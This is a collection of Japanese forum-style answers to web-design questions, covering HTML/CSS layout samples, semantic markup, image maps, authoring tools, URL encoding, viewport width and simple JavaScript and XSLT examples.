ThickBoxはどうでしょうか？。 私は静止画でしか使用したことはありませんが、機能概要によると次のコンテンツを オーバーレイ表示できるようですので、工夫すればスライドも可能かと思います。 　　・単一画像 　　・ギャラリー画像 　　・インラインコンテンツ 　　・iFrame コンテンツ 　　・AJAX コンテンツ 参考URL：http://attosoft.info/blog/thickbox-usage/
そんな、本来表でないものを表にするから無理が来る。 　表は、二次元以上のデータを整理する仕組みですよ。!!! 　　たとえば1列目はタイトル、2列目は画像、3列目は説明、4列目は撮影日時。そして、各行にデータを追加していくという場合です。 ＞「画像<br>説明<br>(新着の物に関しては)新着マーク」　を１つのセルに入れて横４セルの表を作っています。 　ひとつのセルに入れるのでしたら、それはリストですよ。 　また、そのマークアップじゃ、そのデータが「画像」なのか「説明」なのか「新着マーク」なのかがわかりませんよ。 ★単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　その様な場合は、画像リストですから <ul id="photoList"> 　<li> 　　<img src="" width="" height="" alt=""> 　　<p>画像の説明・・・</p> 　</li> 　<li> 　　<img src="" width="" height="" alt=""> 　　<p>画像の説明・・・</p> 　</li> 　<li class="new"> 　　<img src="" width="" height="" alt=""> 　　<p>画像の説明・・・</p> 　</li> ・・・ </ul> 程度で十分ですよ。これだったら簡単でしょ!!! そしてスタイルシートで、ボックスにして並べればよい。ウィンドウ幅が狭ければ2列や3列に並び替えられるし。どの位置だろうが画像は追加できるし、削除も出来る。 　もちろん、他のデザインも自由にも変更できます。(サンプルにはありませんが、画像の縦横比関係なしに納めるとか、画像にマウスオーバーすると画像を拡大するとか・・・ ★タブは＿に置換してあるので戻してください。 ★印刷では表にはならないようにしてある。 ★画像はファイル名だけ適当なものを・・テストですからサイズは当たらなくて良いです。 ★スマホだと2列になるかな <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル0</title> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rel="START" href="../index.html"> ＿<style type="text/css" media="screen"> <!-- #photoList{background-color:gray;width:90%;min-width:480px;max-width:840px;margin:0 auto;} #photoList ul,#photoList ul li{ display:block;list-style:none;margin:0;padding:0; } #photoList ul li{width:200px;height:200px;float:left;background-color:silver;margin:5px;position:relative;overflow:auto;} #photoList ul li img{display:block;border:white 5px solid;box-shadow: 3px 3px 3px rgba(0,0,0,0.4);margin:2px auto;} #photoList ul li p{font-size:0.9em;text-indent:1em;line-height:1.6em;margin:0 1em;} #photoList ul:after{content:"A";width:100%;display:block;clear:left;} #photoList li.new p:after{content:"新着";color:red;background-color:yellow;position:absolute;top:5px;right:5px;text-indent:0;font-size:0.9em;padding:2px;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<div id="photoList"> ＿＿＿<ul> ＿＿＿＿<li class="new"> ＿＿＿＿＿<img src="./images/1.jpg" width="180" height="115" alt="海"> ＿＿＿＿＿<p>画像の説明</p> ＿＿＿＿</li> ＿＿＿＿<li class="new"> ＿＿＿＿＿<img src="./images/2.jpg" width="180" height="115" alt="海"> ＿＿＿＿＿<p>画像の説明・・・</p> ＿＿＿＿</li> ＿＿＿＿<li> ＿＿＿＿＿<img src="./images/3.jpg" width="180" height="115" alt="海"> ＿＿＿＿＿<p>画像の説明・・・</p> ＿＿＿＿</li> ＿＿＿＿<li> ＿＿＿＿＿<img src="./images/4.jpg" width="180" height="115" alt="海"> ＿＿＿＿＿<p>画像の説明・・・</p> ＿＿＿＿</li> ＿＿＿＿<li> ＿＿＿＿＿<img src="./images/5.jpg" width="180" height="115" alt="海"> ＿＿＿＿＿<p>画像の説明・・・</p> ＿＿＿＿</li> ＿＿＿＿<li> ＿＿＿＿＿<img src="./images/6.jpg" width="180" height="115" alt="海"> ＿＿＿＿＿<p>画像の説明・・・</p> ＿＿＿＿</li> ＿＿＿</ul> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<address>&copy; ORUKA1951 2012 - 2016 All Rights Reserved mailto:*****</address> ＿</div> </body> </html>
■ホームページビルダー htmlやcssの知識が薄くても、だいたい何となくレイアウトできます。 ただそういうやり方では、ソースコードはぐちゃぐちゃで、ブラウザによっては崩れたり見れない場合もありますが、それでもいいという方へ向けたツールだと思います。 それでも、最低限のhtmlやcssを知っていないと使うのは厳しいです。 逆に知り尽くしていると当然何でもできますが、そうなるとツールの意味が無いです。 Dreamwerverよりも安価で手を出しやすいのが利点。 ■Dreamwerver htmlやcssを理解している方が、作業効率化の為に使うプロ用ツール。 ビルダーの様に何となくでも使えない事は無いですが、ビルダーよりも初心者向けで無く遥かに高価な為、初心者に勧める意味はあまりないです。 よくわからず使っても、ビルダーと比べるとソースがぐちゃぐちゃになりにくいのは利点。 しかしその利点を目当てに初心者が買うのはもったいないと思います。 恐らくDreamwerverは価格に見合うほど使いこなせないと思いますので、 崩れを覚悟でホームページビルダーを使うのが一番早いと思いますが、 「これから勉強する」という事でしたら、オーサリングソフトを使わずにテキストエディタで更新するのが良いと思います。 ※Windowsのメモ帳でも出来ますが、文字コードの対応が狭いので、よくわからずやると文字化けの恐れがあります。 有名な無料テキストエディタは以下の3つくらいでしょうか。 ・TeraPad ・Crescent Eve ・サクラエディタ これらはどれもhtmlの構築に向いたエディタですので好みで選んで大丈夫です。 個人的にはCrescent Eveが好きですね。
これが動作しない理由は単純に <area shape="rect" href="profile.html"□coords="274,98,417,118"> と□の部分が、全角スペースであるためです。 1) 全角スペースと半角スペースが見分けられるテキストエディタを使う良いです。 2) Vaidator使いましょう。 　　Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html )のDATAタブ 　しかし、それ以前に、HTMLにたくさんの間違いがあります。参考にされているサイトは、とっても古く、間違いも多いようです。 <body bgcolor="#ffffff"> <!-- bgcolorは非推奨です。( http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 … )--> <center> <!-- centerは非推奨でHTML4.01strict以降のHTMLではありません( http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 … ) --> <img src="○○○.jpg" usemap="#△△△" border="0"> <!-- img要素は行内要素です。またwidth,height,alt要素は必須,borderは非推奨( http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 … ) --> <body> <p class="imageMap"> 　<img src="○○○.jpg" usemap="#△△△" width="800" height="600" alt=""> </p> <map name="△△△"> <area shape="rect" href="profile.html"　coords="274,98,417,118"> <area shape="rect" href="gallery.html"　coords="720,559,793,573"> </map> </body> とかです。 　なお、最近はiamegemapを使わず、普通にHTMLを作成してスタイルシートを使うほうが多いでしょう。特にrectですむ場合は!! <body> 　<div class="header"> 　　<h1>タイトル</h1> 　　<div class="nav"> 　　　<ol> 　　　　<li><a href="/">TOP</a></li> 　　　　<li><a href="profile.html">Profile</a></li> 　　　　<li><a href="gallery.html">Gallery</a></li> 　　　</ol> 　　</div> 　</div> 　<div class="section"> 　　<h2>本文</h2> 　</div> 　<div class="footer"> 　　<h2>文書情報</h2> 　</div> </body> として、スタイルシートでデザインします。こうしておけば、全く異なるデザインにすることも、もっとインタラクティブに表現することも可能ですし、検索エンジン対策も優れています。 ★HTMLにはデザインに関わること一切書かなければ、自由にデザインできます。 　⇒ナビゲーションリストを様々にデザインしてみよう。( http://www.ichiya.com/WebService/Howto/sample/HT … ) 　にて、ブラウザの表示メニューから[スタイルシート]に進み、任意のスタイルを選択するか印刷プレビューで、スタイルシートひとつ書き換えるだけで自由にデザインできることが分かります。 　[画像の上に配置]が、下記のサンプルと似た方法です。 HTML4.01strict+CSS2.1のサンプル ★Another HTML-lint 5( http://www.htmllint.net/html-lint/htmllint.html ) 　のDATAでチェック済み ★タブは＿に置換してあるので戻すこと 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- div.header div.nav{ width:800px;height:600px; margin:0 auto; background-image:url(./images/sample800-600.jpg); position:relative; } div.header div.nav ol,div.header div.nav ol li{ display:block;list-style:none; margin:0;padding:0; text0align:center; } div.header div.nav ol li{ position:absolute; top:10px;left:10px; width:60px; } div.header ol li a{ display:block; border:outset 2px white; text-indent:-10em; overflow:hidden; } div.header div.nav ol li.profile{ width:113px;height:20px; left:274px;top:98px; } div.header div.nav ol li.gallery{ width:73px;height:14px; left:720px;top:559px; } div.header ol li a:hover{border-color:red;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<div class="nav"> ＿＿＿<ol> ＿＿＿＿<li><a href="/">TOP</a></li> ＿＿＿＿<li class="profile"><a href="profile.html">Profile</a></li> ＿＿＿＿<li class="gallery"><a href="gallery.html">Gallery</a></li> ＿＿＿</ol> ＿＿</div> ＿</div> ＿<div class="section"> ＿＿<h2>本文</h2> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿</div> </body> </html>
細かい位置調整してないけど、例です。 ★タブは、＿に置換してある。 ★HTMLはシンプル--何も細工はない ★サイズはリキッドですから、ウィンドウ幅を変えても良い。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;background-color:silver;} h1,h2,h3,h4{margin:0;line-height:1.2em;} div.header,div.section,div.footer{margin:0 auto;width:95%;min-width:480px;max-width:1000px;background-color:white;} div.header{height:110px;margin-top:30px;text-align:center;} div.header div.hgroup{width:400px;margin:0 auto;height:100px;} div.header div.hgroup h2{font-size:1.1em;text-align:right;} div.header div.nav{background-color:black;width:100%;padding-top:30px;position:relative;top:-30px;} div.header div.nav ol{width:480px;margin:0 auto;height:200px;display:block;list-style:none;padding:0;position:relative;font-size:0;background-color:lime;} div.header div.nav ol li{display:inline-block;width:20%;margin:0;padding:0;font-size:16px;position:relative;lin-height:30px;line-height:30px;} div.header div.nav ol li a{display:block;width100%;height:100%;background-color:aqua;} div.header div.nav p{position:absolute;bottom:0;left:50%;} div.section{border:white solid 1px;padding-top:10px;margin-top:150px;} div.section h2,div.section h3,div.section h4{font-size:1.4em;} div.section div.section{min-height:200px;margin-top:0;} div.section div.section{width:100%;margin:0;} div.section h1,div.section h2,div.section h3{font-size:20px;border:solid gray 1px;border-radius:5px;padding:3px;} div.footer div.nav{position:absolute;top:0;left:0;background:linear-gradient(rgb(192,250,250),rgb(156,225,225));width:100%;height:30px;} div.footer div.nav ul,div.footer div.nav ul li{line-height:30px;display:block;list-style:none;margin:0;padding:0;} div.footer div.nav ul li{display:block;float:left;width:10em;} div.footer div.searchForm{position:absolute;right:3%;top:40px;} div.footer div.searchForm h3{background-color:navy;color:white;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<div class="hgroup"> ＿＿＿<h1>タイトル</h1> ＿＿＿<h2>あいうえお</h2> ＿＿</div> ＿＿<div class="nav"> ＿＿＿<ol> ＿＿＿＿<li><a href="A">あ</a></li> ＿＿＿＿<li><a href="B">い</a></li> ＿＿＿＿<li><a href="C">う</a></li> ＿＿＿＿<li><a href="D">え</a></li> ＿＿＿＿<li><a href="E">お</a></li> ＿＿＿</ol> ＿＿＿<p>ここにも花が咲いています</p> ＿＿</div> ＿</div> ＿<div class="section"> ＿＿<h1>本文見出し</h1> ＿＿<p>テキストテキストテキストテキスト</p> ＿＿<div class="section"> ＿＿＿<h2>章見出し</h2> ＿＿＿<p>テキストテキストテキストテキスト</p> ＿＿＿<div class="section"> ＿＿＿＿<h3>項見出し</h3> ＿＿＿＿<p>テキストテキストテキストテキスト</p> ＿＿＿</div> ＿＿＿<div class="section"> ＿＿＿＿<h3>項見出し</h3> ＿＿＿＿<p>テキストテキストテキストテキスト</p> ＿＿＿</div> ＿＿</div> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<div class="nav"> ＿＿＿<ul> ＿＿＿＿<li>電子メールで送信[M]</li> ＿＿＿＿<li>印刷[P]</li> ＿＿＿＿<li>スライドショー</li> ＿＿＿</ul> ＿＿</div> ＿＿<div class="searchForm"> ＿＿＿<h3>サイト内検索</h3> ＿＿＿<form action=""> ＿＿＿＿<p> ＿＿＿＿＿<input type="text" size="10" name="name" value=""><input type="submit" value="検索"> ＿＿＿＿</p> ＿＿＿</form> ＿＿</div> ＿</div> </body> </html>
＞この部分なのですが、画像の横の大きさがバラバラなので テンプレートではすべての箱の大きさを500x300に統一していますが、箱（画像）の 大きさがバラバラであれば、ここは削除して前回と同じように個々の画像のdivのstyleで widthとheightを指定してください。
そのまえにarticleの使い方が違うのですが？？ 簡単に言うと articleは内部に、header,section,footer要素を持つと期待されるそれ自体で完結した記事です。 <article> 　<header><header> 　<section> 　　<article> 　　　<header></header> 　　　<section></section> 　　　<footer> 　　</article> という意味です。 その文書にheader,footerがひとつしかなければ全体をarticleで囲う必要はありません。 <body> 　<header> 　　<h1></h1> 　</header> 　<section><!-- h1～h6を必ずひとつだけ持つと期待される --> 　　<h2>・・</h2><!--header/h1と同じレベルなら<h1>でも -->　　 　　<section> 　　　<h3></h3> 　　　<section> 　　　　<h4></h4> 　　　</section> 　　</section> 　</section> 　<footer></footer> </body> h１～h6の階層の意味は、section要素の階層で見出しレベルが明白な場合は、 　　　　　　　　　　　　　　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ すべてをh1で統一しても良いが、後方互換もありh1～h6のレベルはsectionに合わせても良い。 ただし、何れかに統一せよ!! 　という意味です。 また、 A general rule is that the section element is appropriate only if the element's contents would be listed explicitly in the document's outline.( http://www.w3.org/TR/2012/CR-html5-20121217/sect … ) 　ですからね。 　articleはは、独立していますから、それ自体単独でh1を持ちえます。 　どちらを使うべきかは 　⇒The section element | HTML5 Doctor( http://html5doctor.com/the-section-element/ )
（１）の方もおっしゃっていますが、このページのデザイン（枠とか色の指定など）をしている部分は、別のスタイルシートに書かれています。 あくまで想像と推測での返答になってしまいますが、1行目に <div class="plugin1_outline"> と、ありますよね。このdivタグは全体を囲っているようです。 一番下の行の </div><!--/plugin1_outline--> で閉じられて一つのデザインできるボックスを作っています。 sunaesunaeさんのおっしゃる「枠」が、実際にページをご覧になった時に、文章の部分の「プロフィール」や「ブログＦＣ２へようこそ！…」などの部分を囲んでいるとすれば、おそらくこのdivタグで作ったボックスが枠となっているはずです。class名にも「outline」と名付けてありますし…。 以下は余談です… ちなみに好みのデザインに変更したりする事は、このhtmlから直接はできません。 このhtmlで使用している「CSS」または「スタイルシート」と呼ばれるファイルが見られるのなら、その中に下記のような行があるはずです。 .plugin1_outline で、CSS内を検索してみると簡単に見つかるはずです。 ↓こんな行 .plugin1_outline{ } この部分の ｛ ｝ の間に枠のデザイン指定が書かれています。ここを書き換えると枠のデザイン変更ができるはずです。 以上、余談でした…。
★そんなおかしな<form>はありえません。 　具体的に何をされたいのかを説明いただくほうが早いです。 　formの用途は、『フォーム処理のためにWebサーバやメールサーバ等のエージェントへとフォームを提出する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』のが目的ですから。そのように動作するべきなのです。 ★ひょっとして、tableを使うこと自体が誤りの可能性があります。
http://www.dclog.jp/sp/howtouse/blogtop.html#9の、 ＞・文字を線で囲う(テーブルタグ) を参考に、 <table> <tr><td>タイトル</td></tr> <tr><td background="背景の画像"></td></tr> </table> という作りになります。<tr></tr>で囲んでいるところで一段目が終わります。実際の内容は<td></td>で囲みます。 ＞画像サイズはどれくらいまでですか？ 240×320くらいにおさめたらいかがでしょうか。
こちらの商品で合っていると思います。 http://www.clog.jp/
なにかサーバーサイドで動く仕組みを作ってあげれば実現できるよ。 cronなんかで一定時間ごとにそのプログラムをキックして、ファイルの中の更新日時を拾ってリストアップするとか。 まあがっつりプログラムで組む必要があるよ。
http://www.yahoo.co.jp/ の意味は、HTTPプロトコルで、//インターネット上の www.yahoo.co.jp に対してという意味です。 <FORM action="C:\Users\Public\Documents\index.html"> ではなくて、 <FORM action="fille:///C:\Users\Public\Documents\index.html"> と通信手段を提示しなければなりません。 一番よいのは、apacheなどのHTTPサーバーをインストールして、http://local.host/index.htmlのようにアクセスできるようにする事です。 　その元HTMLがネットにあろうがローカルにあろうが・・ 　formは、サーバーに対してデータを送信して、サーバー側でプログラムを動作させる仕組みですから、必ずサーバーやPerl,PHPなどを整えないとテストも出来ませんからね。 　できれば、C:じゃなく別パーテーション(ドライブ)にローカルサーバーを用意しましょう。 F: / |-- users |　　　|-- Public |　　　　　　|-- Documents |　　　　　　　　　|-- index.html |--usr |　　　|-- local |　　　|　　　|--apach |　　　|-- bin |　　　|　　　|-- perl とか・・
＞画像からリンクを設定すると妙な間があって気になります。 どこのことを指しているのかよくわかりませんが… リンク先とクリックした画像の関係のことを言っているのであれば、画像の切替えの仕組みとして、画像を重ねておいて上にある画像をフェードアウトしていますが、クリックした際にほとんど透明になっていても上にある画像がクリックされたと認識されます。 このあたりが、見た目と印象が違うのが原因ではないでしょうか？ 意味が違っていたら、無視してください。
> PC（chrome, IE）、iOS(Safari)では、http://○○○○.comと表示されて何の問題もありませんが、なぜかAndroidで見るとPunycodeですらない数字や%記号となってしまいます。 まずこっちについて。 > http://L/****************・・・.com このURLの「L」の部分に日本語が含まれるなら日本語ドメインであり、 この部分はPunycodeに変換されます。 「****************・・・.com」の部分はパスですから日本語はブラウザ側でURLエンコードされ、 　「テスト」→「%E3%83%86%E3%82%B9%E3%83%88」(UTF-8の場合） と内部で変換されます。 このとき、アドレスバーが「テスト」のままか、「%E3%83%86%E3%82%B9%E3%83%88」に変わるかはブラウザによって変わりますが、 どちらの場合でも動作に違いはありません。 > ブックマーク登録をしてもブックマークから接続されないという不具合があります。 こちらについては確かなことは言えませんので思いつきですが……。 上記の例からわかるように、URLエンコードをすると文字数が大幅に増えます。 もしかするとブラウザ側で保存できるURLの文字数を超えてしまっているかもしれません。 エンコード前のURLでブックマーク登録するか、短縮URLを使うかすると解決するかも？
それはありません。 　どこから得たデマか知りませんが・・・ 　ただ、{background-color:blue;color:lightskyblue}はアクセシビリティ(WAI)では、望ましいとは言えないでしょう。 　⇒WAIガイドライン:ページ制作( http://www.doraneko.org/wai/contents10/19980918/ … )
その他のコンテンツの更新率と比較して、h1だけが多く更新されると、クローラーが判定を下した場合、SEO上の不利益を被るかもしれません。 SEO対策サイトではh1は関係ある・ない分かれているように拝見します。 W3C上は1つの文章に1つしか書けないことになっています。 上記のことから（私見ですが）サービスによって状況は分かれているように思われます。 名言することができなく申し訳ありませんが、文頭のぼやけた回答となります。 ただ、この場合、私でしたら質問の処置はいたしません。 キーワードの頻繁な変更はSEO上不利であり、例えばmeta,titleなど考えられますが、その中にh1が含まれることは、W3C上、ページに1つしか書けないという事情から考えられることだからです。 SEO以外の目的であれば（たとえば、利用者向けの目的）なのであれば質問の処置をすると思います。
サーバーとかには全く無関係でブラウザの機能です。 HTTPプロトコルは、基本的にセッション単位の接続になります。FirefoxのLive HTTP Headersを使えば一目瞭然ですが、 http://kudamono.com 　という要求に対して、DIRECTORY INDEXで指定してあるファイルが送り返されていますから、ブラウザはカレント(現在地)は/だということを知っています。 　ここでページ内に <a href="./mikan/"> <a href="mikan/"> のいずれであっても、ブラウザはサーバーに対して、 GET /mikan/ を要求していますね。!!! 　ここからは、HTTPサーバーの仕事になります。すなわち /mikan/ 　を開こうとします。これはディレクトリですから、そのディレクトリにDIRECTORY INDEXが指定されていれば、そのファイルを提供します。 　もし、 <a href="/mikan/index.html"> 　でしたら、ファイル名まで指定するほうが、動作的には負荷は少ないですが、問題になる差ではないでしょう。 ＞(index.htmlなしのページに正規化しています) 　この意味が分からないのですが、PATH_INFOで動的にコンテンツを作成しているのですか？単にファイルなり実行ファイルでしたらDIRECTROY INDEXで指定しますけど・・ [apache httpd.conf] <IfModule dir_module> DirectoryIndex index.html index.htm index.cgi index.sh </IfModule> とか・・
Googleは、Web検索を外部プログラマが利用できるよう、Google Web APIを公開しています。 このAPIは制限があり、一日1000クエリまで、検索結果もGoogleの検索サイトと少し異なるようです。 この問題を回避するため、Google検索にクエリを投げてHTMLを解析しようとすることがありますが、（Googleの）ライセンス違反の恐れが高いですし（他人のコンテンツをキャッシュしてビジネスしてるのに）、検索結果のHTML自体が頻繁に内容が変わって解析できなくなってしまうことがあります。 本音と建前が出てしまいますが、冒頭が回答になります。
CSSもちゃんとコンソールにエラーが出ますから活用して下さい またChromeのデベロッパーツールなどでは改善すべきポイントを調査することもできます
>[1]スマホのメーカーページ仕様表に出てくるような解像度とデバイス幅（device-width）はまったく異なるものなのか？ 解像度はディスプレイの解像度です。 device-widthの前に、viewportをデスクトップPCで例えて説明します。 デスクトップPCに21インチ1920 x 1080のディスプレイをつないで、 画面のプロパティで解像度を1680 x 1050ピクセルにすると、 ディスプレイのサイズ：21インチ ディスプレイの解像度：1920 x 1080 デスクトップのサイズ：1680 x 1050 となります。 このデスクトップのサイズがviewportに相当します。 スマホ/タブレットPCではデスクトップサイズを変更する代わりに、ブラウザウインドウサイズを使って仮想的に変更しています。 width = device-widthにしたときのdevice-widthはこの「画面プロパティの解像度」の"デフォルト値"だと思います。 >[2]device-widthの値を知る術はあるのか？ screen.widthがdevice-width（デスクトップサイズのデフォルト値）になると思います。 ※あくまで「思います」です。ブラウザ依存（機種依存）があるかもしれません。 <meta>で指定されたwidthを取得するなら、document.body.clientWidth（margin、border、paddingの影響を受けます）を取得するか、 <meta>要素のcontent属性値の、"width=(数値)"という部分から取得できると思います。 「思います」が多くてすみません。 screen.widthとdevice-width、viewportとの関係は仕様書などに書かれていませんので、JavaScriptで検証した内容からの推測です。 https://developer.apple.com/library/safari/#docu … http://dev.opera.com/articles/view/an-introducti … >[3]ブレイクポイントを決めるコツは？ すみません、ブレイクポイントが何のことかわからないのでお答えできません。
ファビコンが壊れている、という状態は時々発生します。 ・システムの復元 ・ソフトのアンインストール を行った後に発生しやすいような気もしますが、 はっきりとは分かりません。
任意のファイル名、拡張子で保存する場合 「ファイルの種類」を「すべて」にする。テキストに指定してあると.txtになる。 　　・・・Windowsという、変なソフトは拡張子にこだわるので また、ファイル名(拡張子まで含めて)を指定する場合は、ファイル名の前後を""でくくります。(これは基本操作です) .htaccess のようにファイルいのない設定ファイル abc のように拡張子のないファイルを保存するときは、こちらを使います。
こんにちは。 JavaScriptを利用することになります。 その入力が同じ名称(例えば:prm_text)であれば以下のようにすれば良いです。 <script type="text/javascript"> window.onload = function() { var inputObj = document.getElementsByName('prm_text'); for ( var i = 0; i < inputObj.length; i ++ ) { // フォーカスが外れたら実施 inputObj[i].onblur = function() { // 入力値が空でない場合は背景色を#fccに変更。 // 空の場合は#fffに変更 this.style.backgroundColor = this.value !== '' ? '#fcc' : '#fff'; } } } </script>
そのサイトでは <p id="right"><a href='#top'><img src="●○.gif"></a></p> p#right img{ position:fixed; right:20px; bottom:0px; z-index:5; } となっています。 band_dayo さんの作られるサイトの構造によっては、そのままコピペだけで使えるかもしれません。 構造によっては、親要素の調整が必要です。 調整される場合は、positionおよびz-indexの解説を読めばおそらくわかると思います。ブラウザの解釈が違うので、場合によっては全てのブラウザで同じように見せるのは不可能な場合もあります。
・コンテンツを魅力あるものにし、更新頻度を上げる に尽きるんじゃないかと。SEOなんて副次的なものでしかないですしね。
　XMLでの簡単なループ処理の実例を上げて置きます。XHTMLもXMLですから、同様にXSLTスタイルシートを使うことで、ループ処理が出来ます。 [XML] <?xml version="1.0" encoding="UTF-8"?> <?xml-stylesheet type="text/xsl" href="style.xsl"?> <DOC> <TITLE>Title Here</TITLE> <AUTHOR> <FIRSTNAME>Firstname</FIRSTNAME> <LASTNAME>Lastname</LASTNAME> </AUTHOR> <PARAGRAPH> <LINE N="1">First line.</LINE> <LINE N="2">Second line.</LINE> </PARAGRAPH> <PARAGRAPH> <LINE N="3">Third line.</LINE> <LINE N="4">Fourth line.</LINE> </PARAGRAPH> </DOC> [XSL]style.xsl <?xml version="1.0" encoding="UTF-8"?> <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"> <xsl:template match="/"> <html> <head> <title>サンプル</title> </head> <body> <h1>ページを作る</h1> <div class="album"> <h2>画像一覧</h2> <xsl:apply-templates /> </div> </body> </html> </xsl:template> <xsl:template match="PARAGRAPH"> <div class="section"> <xsl:apply-templates /> </div> </xsl:template> <xsl:template match="LINE"> <p> <xsl:apply-templates /> </p> </xsl:template> </xsl:stylesheet> 　上記は、<PARAGRAPH>要素、<LINE>が登場するたびに、<div class="section">と<p>を挿入しています。 　XHTMLもXMLですから、XHTMLで書かれた定型のHTMLの、各セクション間に別途プレゼンテーションのための要素を追加するなどでが可能です。 【確認方法】 firefoxで画面上で右クリック--コンテキストメニューからソース表示 firebugを利用してソースを確認すると、HTMLになっています。 　
selectivizr.js、html5shiv.jsの機能をmain.jsで利用するならば、main.jsを後に記述してください。 ・ロードは定義順（IE7)あるいは並列（IE8) 　http://webforscher.wordpress.com/2010/06/08/tami … ・解釈は定義順に依存する 　http://blog.glasses-factory.net/2011/11/29/JS-wi …
私も、その辺気にしてたとこなのですが、 リンク先のWAVファイル再生できましたよ。クリックしただけで。 バージョン確認しましたが、最新とでました。 Audio再生関連のあたりで何かトラブル（設定？）あるのでは？
マウスのポイントで横スクロールはjqueryにあります。 　⇒画像を使ったいろいろなjQueryプラグイン224個まとめ( 200+ collection of jQuery for images ) - かちびと.net( http://kachibito.net/web-design/224-image-jquery … ) 画像の上にリンクを置くのは、単にナビゲーションのデザインです。 HTMLは、 <div class="nav"> 　<ol> 　　<li> 　　　<ol> 　　　　<li><a href=""></a></li> 　　　　<li><a href=""></a></li> 　　　　<li><a href=""></a></li> 　　　　<li><a href=""></a></li> 　　　</ol> 　　</li> 　　<li> 　　　<ol> 　　　　<li><a href=""></a></li> 　　　　<li><a href=""></a></li> 　　　　<li><a href=""></a></li> 　　　　<li><a href=""></a></li> 　　　</ol> 　　</li> ・・・【中略】・・・ 　</ol> </div> で良いです。HTMLさえ正しく書けていれば、どうにでもなりますよ。 　⇒ナビゲーションリストを様々にデザインしてみよう。( http://www.ichiya.com/WebService/Howto/sample/HT … ) 　にて、[表示]→[スタイルシート]→[画像の上に配置]がひとつの方法化と・・
WebSocketを用いてNodejsを使うと楽にできます
専門的な回答は他の皆様がやられているので、個人的意見をば。 ・tableタグは「表」をデザインするもの。 ・divはスタイルを指定するもの というイメージです。 初心者ならば、divをあまり気にする必要はありません。 おっしゃるとおり、tableでほぼ実現出来ます。 しかし、そのうち「ああ、この書き方では無駄が出る」「この書き方だとソースコード（HTMLで書かれた物）が見難い……」なんて思い始めることでしょう。 それが成長ですね。 一歩踏み出して「CSS」と呼ばれるものに手を出してみましょう。 ここからが、「div」さんに有り難みを感じ始める時です。 もしかしたらCSSより先に、JavaScriptに興味が向くかも知れません。 同様に「div」さんにありがたみを感じると思います。 ▽　以下、少し詳しく（少し難しくなってきます）　▽ 例えば、「見出しを作りたい！」なんて思うとしましょう。 その見出しは目立たせなくてはいけません。 そして複数作らないといけない場合、いちいち <table border="1"><tr><td><font size="7" color="#ff0000">見出し1</font></td></tr></table> <table border="1"><tr><td><font size="7" color="#ff0000">見出し2</font></td></tr></table> <table border="1"><tr><td><font size="7" color="#ff0000">見出し3</font></td></tr></table> <table border="1"><tr><td><font size="7" color="#ff0000">見出し4</font></td></tr></table> <table border="1"><tr><td><font size="7" color="#ff0000">見出し5</font></td></tr></table> ・ ・ ・ な～んて書いてたら、ゴッチャゴチャになりますよね？ そんな時に役に立つのがCSSと呼ばれるものです。 一箇所に文字の大きさやら背景色やらを定義しておきます。 <style type="text/css"> <!-- .topic{ COLOR: #ff0000; FONT-SIZE: 20px; } --> </style> そしてdivさんにお願いします。 <div class="topic">見出し1</div> <div class="topic">見出し2</div> <div class="topic">見出し3</div> <div class="topic">見出し4</div> <div class="topic">見出し5</div> ・ ・ ・ ほら、少しはスッキリしたのではないでしょうか。 こんな感じで使えます。 No.2さんなどとかぶってしまったかな？＾＾；
